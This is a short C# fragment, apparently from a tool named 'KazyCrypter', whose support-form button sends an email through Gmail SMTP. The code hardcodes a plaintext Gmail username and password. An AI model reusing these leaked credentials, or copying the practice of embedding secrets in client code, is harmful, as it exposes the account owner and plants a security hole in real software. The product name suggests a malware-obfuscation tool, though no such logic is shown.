        private void button6_Click(object sender, EventArgs e)
        {
            new Thread(() =>
                {
                    SmtpClient smtp = new SmtpClient
                    {
                        Host = "smtp.gmail.com",
                        Port = 587,
                        EnableSsl = true,
                        DeliveryMethod = SmtpDeliveryMethod.Network,
                        UseDefaultCredentials = false,
                        Credentials = new NetworkCredential("gegi95@gmail.com", "Gergely95")
                    };
                    MailMessage msg = new MailMessage(new MailAddress("support@kazycrypter.com", "KazyCrypter Support"), new MailAddress("gegi1995@gmail.com"));
                    msg.Subject = "Support - " + comboBox3.Text;
                    msg.Body = "Username: " + LicenseGlobal.Seal.Username + "\n\n" + richTextBox3.Text;
                    smtp.Send(msg);
                    MessageBox.Show("Your message has been sent!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    richTextBox3.Text = "";
                }
            ).Start();
        }
    }
}
